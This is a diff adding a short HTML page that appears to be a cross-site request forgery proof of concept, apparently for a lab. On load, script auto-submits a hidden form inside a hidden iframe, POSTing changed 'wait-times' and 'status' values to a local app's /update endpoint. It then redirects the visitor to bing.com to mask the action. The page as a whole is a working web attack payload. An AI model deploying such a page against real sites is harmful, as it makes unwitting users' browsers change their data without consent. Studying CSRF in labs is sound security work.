@@ -1,0 +1,19 @@
+<HTML>
+    <head>  
+    </head>
+    <BODY>
+        <iframe id="frame" name="frame" style="visibility: hidden;"></iframe>
+        <form method=POST target="frame" name="transferform" style="display:none;" action="http://127.0.0.1:5000/update" onsubmit="redirect()">
+            <input type="text" name="wait-times" value="> 20 min">
+            <input class="form-check-input" type="checkbox" role="switch" name="status" checked>
+            <input type=submit name=submission id="sub" value="Send" >
+        </form>
+        
+    </BODY>
+    <script>
+        document.getElementById("sub").click();
+        function redirect(){
+            window.location.href = "http://www.bing.com";
+        }  
+   </script>
+</HTML>
